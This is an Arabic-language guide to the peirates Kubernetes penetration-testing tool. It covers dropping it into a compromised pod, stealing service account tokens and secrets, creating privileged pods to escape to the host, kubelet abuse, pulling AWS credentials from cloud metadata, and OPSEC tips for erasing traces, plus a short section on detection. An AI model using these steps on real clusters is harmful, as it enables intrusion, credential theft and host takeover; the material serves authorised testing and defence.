# peirates — الدليل الكامل لاختبار اختراق Kubernetes

تُعد أداة `peirates` (من تطوير InGuardians) إطار عمل متطوراً مخصصاً لاختبار اختراق بيئات Kubernetes. بمجرد الحصول على موطئ قدم داخل حاوية (Pod)، تقوم الأداة بأتمتة عمليات تعداد الرموز (Token Enumeration)، وهجمات تحليل حواف RBAC، واستخراج الأسرار (Secrets Extraction)، وإساءة استخدام Kubelet، والهروب من الحاويات (Pod Escapes). يمكن وصفها بأنها أداة Pacu ولكن لبيئات Kubernetes.

## التثبيت (Install)

يتم رفع الملف الثنائي (Static Binary) مباشرة إلى الحاوية المخترقة:

```terminal
# من جهة المهاجم: بناء أو تحميل الأداة
go install github.com/inguardians/peirates@latest

# أو تحميل نسخة جاهزة:
wget https://github.com/inguardians/peirates/releases/latest/download/peirates -O /tmp/peirates
chmod +x /tmp/peirates
```

يفضل نقل الأداة عبر Web Shell أو استخدام أمر `kubectl cp` إذا كان الوصول متاحاً بالفعل.

## التشغيل (Run)

```terminal
./peirates
```

سيتم تحميل قائمة تفاعلية. تقوم الأداة تلقائياً بقراءة رمز حساب الخدمة (Service Account Token) من المسار الافتراضي: `/var/run/secrets/kubernetes.io/serviceaccount/token`.

## مجموعات القائمة (Menu groups)

| النطاق | المجموعة |
|---|-------|
| 0–9 | تعداد الحاويات والرموز (Pod / token enumeration) |
| 10–19 | عمليات RBAC، وسرقة ملفات الإعداد والأسرار |
| 20–29 | التحكم في الحاويات (Pods) وعمليات النشر (Deployments) |
| 30–39 | هجمات Kubelet |
| 40–49 | الانتقال إلى بيانات ميتادات السحابة (Cloud Metadata Pivot) |
| 50–59 | ضمان البقاء (Persistence) |
| 60+ | متنوع |

قد تتغير أرقام القائمة بين الإصدارات — استخدم `?` دائماً لعرض القائمة الحالية.

## عمليات عالية القيمة (High-value actions)

| الخيار | التأثير |
|------|--------|
| `1 — get pod list` | عرض الحاويات النشطة في العنقود (Cluster) |
| `2 — get nodes` | عرض العقد (Nodes) المكونة للعنقود |
| `4 — token from a pod's SA` | سرقة رمز حساب الخدمة من حاوية أخرى (في نفس النطاق، إذا سمح RBAC) |
| `7 — list secrets` | استخراج أسرار Kubernetes |
| `9 — get cloud metadata` | الوصول إلى IMDS — غالباً للحصول على صلاحيات AWS |
| `13 — RBAC attack — escalate` | محاولة تنفيذ مسارات تصعيد الصلاحيات المعروفة |
| `20 — exec on a pod` | تنفيذ أوامر داخل حاوية (شبيه بـ `kubectl exec`) |
| `21 — create privileged pod` | إنشاء حاوية ذات صلاحيات مرتفعة للهروب إلى المضيف (Host) |
| `30 — kubelet abuse` | التواصل مع واجهة برمجة تطبيقات kubelet (منفذ 10250) مباشرة |
| `45 — find AWS credentials` | البحث عن بيانات اعتماد AWS في متغيرات البيئة أو الأسرار |
| `99 — drop to shell` | الخروج من القائمة التفاعلية |

## سير العمل (Workflows)

### الخطوات القياسية بعد اختراق حاوية

```terminal
./peirates
peirates> 1     # عرض الحاويات — ما الذي يمكنني رؤيته؟
peirates> 7     # هل توجد أسرار قابلة للقراءة؟
peirates> 9     # الحصول على رموز ميتادات السحابة
peirates> 21    # إنشاء حاوية بصلاحيات مرتفعة — تقوم تلقائياً بتركيب (Mount) جذر المضيف
```

### إنشاء حاوية "خبيثة" بصلاحيات مرتفعة (الخيار 21)

تقوم الأداة بتوليد ملف تعريف (Manifest) يستخدم خصائص `hostPID/hostNetwork: true` و `privileged: true` مع تركيب جذر المضيف في المسار `/host`. بعد التشغيل، يمكنك الدخول للحاوية وتنفيذ `chroot /host` للوصول الكامل للمضيف.

### الهروب عبر Kubelet (الخيار 30)

إذا كان Kubelet على العقدة يسمح بـ `anonymous-auth=true` أو يقبل رمز حساب الخدمة الخاص بك، تتيح لك الأداة عرض الحاويات وتشغيل الأوامر عليها عبر نقطة النهاية `/run/` متجاوزة بذلك بعض قيود RBAC.

### الانتقال إلى السحابة (الخيار 9)

```
peirates> 9
[+] Reaching IMDSv1...
[+] Got AWS creds:
    AccessKeyId: ASIA...
    SecretAccessKey: ...
    Token: ...
[+] Saved to env. Use 'aws ...' from this shell.
```

## النتائج المتوقعة (Good output)

```
peirates> 1
[+] Listing pods:
NAMESPACE  NAME           STATUS
default    web-0          Running
kube-system  metrics-server Running

peirates> 7
[+] Listing secrets:
default/my-app-db-creds
[+] Reading default/my-app-db-creds:
DB_USER: appuser
DB_PASS: SuperSecret1!
```

## الأخطاء الشائعة وحلولها (Bad output / fixes)

| العرض | الحل |
|---------|-----|
| `forbidden: ... cannot list pods` | قيود RBAC تمنع ذلك — استخدم `auth can-i` أولاً لمعرفة المسموح |
| `connection refused` للـ apiserver | سياسة شبكة أو مشكلة DNS — جرب استخدام عنوان IP الخاص بالعنقود مباشرة |
| فشل إنشاء حاوية ذات صلاحيات | تفعيل PodSecurityAdmission أو OPA — حاول الهروب بصلاحيات أقل (hostPath فقط) |
| ميتادات السحابة لا تعيد نتائج | تفعيل IMDSv2 مع تقييد hop-limit — هجمات SSRF تتطلب ترويسة PUT |

## منظور المدافع الأمني (Defender's Perspective)

يمكن اكتشاف نشاط الأداة بسهولة عبر:

- **سجلات التدقيق (Audit Logs)**: مراقبة طلبات `pods/exec` و `pods/create` الصادرة من حسابات خدمة الحاويات.
- **الحاويات المشبوهة**: رصد أي حاوية جديدة تقوم بتركيب المسار `hostPath: /`.
- **سلوك الأسرار**: رصد عمليات `secrets get` المكثفة من حساب خدمة ذو صلاحيات منخفضة.

أفكار للاكتشاف:
- استخدام قواعد **Falco**: رصد فتح Shell داخل حاوية أو إنشاء حاوية بـ hostPath.
- تنبيهات سجل التدقيق: أي حساب خدمة يحاول إنشاء حاوية ذات صلاحيات (Privileged Pod).
- تفعيل سياسات الشبكة (Network Policy) بنمط Deny-all لمنع الحاويات من التواصل مع apiserver إلا للضرورة.

## أمن العمليات (OPSEC)

- ارفع الملف الثنائي في مسار `/tmp` فقط، وقم بحذفه فور الانتهاء.
- عمليات تصعيد الصلاحيات تترك أثراً واضحاً في السجلات. استخدم الأداة للاستطلاع (Enumeration) وقم بالتصعيد يدوياً وبحذر.
- تذكر أن رموز حسابات الخدمة المسروقة يمكن تتبعها جنائياً؛ فكر في إنشاء حاوية جديدة لاستخدامها كقاعدة ارتكاز بدلاً من الاعتماد الكلي على الحاوية الأصلية المخترقة.

## الأدوات ذات الصلة (Related tools)

| الأداة | التخصص |
|------|-------|
| **kubeletctl** | إساءة استخدام Kubelet بشكل خاص |
| **botb** (Break Out The Box) | نماذج استغلال للهروب من الحاويات |
| **deepce** | تعداد مسارات تصعيد الصلاحيات داخل الحاويات |
| **kube-hunter** | مسح Kubernetes بحثاً عن ثغرات قبل المصادقة |
| **Pacu** | إطار عمل لاستغلال بيئات AWS (مكمل لعمليات ما بعد اختراق العنقود) |
